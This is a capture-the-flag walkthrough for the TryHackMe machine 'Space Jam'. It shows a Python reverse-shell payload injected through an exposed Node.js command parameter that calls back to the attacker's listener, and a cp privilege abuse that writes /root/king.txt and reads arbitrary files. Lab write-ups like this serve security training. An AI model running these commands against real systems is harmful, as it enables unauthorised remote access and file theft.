#  Machine name: SPACE JAM

This machine is race to root kind of thing, There is a very low hanging fruit to get root, But it is a way use only entry, i.e. Whoever uses it first will try his best to destory this entry as it is too open. <br />

1. As always we do the basic nmap scan.<br />
![image](https://user-images.githubusercontent.com/54495695/81496158-2a151180-92d3-11ea-9d72-110073c4fbac.png)

2. We can see port 3000 is hosting Nodejs openly, So we try to get the reverse shell from it.<br />
    To do that, First start a listener on your machine using these commands:<br />
       `ncat -lvnp 4444` // I am using ncat, since I am on a Arch based system, You can use `nc` inplace of ncat.<br />
     Once the listener is ready, we deploy the payload.<br />
3. After testing many payloads we found the one of python to be working, For more payloads, follow this link.<br />
    The payload:<br />
           REPLACE <REMOTE_IP> with the IP of box.<br />
           REPLACE <LOCAL_IP> with the IP of your tryhackme VPN.<br />
   
        curl "<REMOTE_IP>:3000/?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<LOCAL_IP>%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"

    On listener, you can see that we have a shell now.<br />
   
 4. After trying a lot of tests and linPEAS, I found that the easiest method to get king AND root shell is to exploit the `cp` vulnerability on the box. I am leaving the ideas to you for this one, but after making you king.<br />
 
    `LFILE=/root/king.txt`<br />
    `echo "<YOUR USERNAME>" | cp /dev/stdin "$LFILE"`<br />
#### YOU ARE KING. NOW DEFEND YOUR TITILE.<br />
Free Tip: (You know you can read anyfile with this vuln, use your imagination.)<br />
    `LFILE=file_to_read`<br />
    `cp "$LFILE" /dev/stdout`<br />
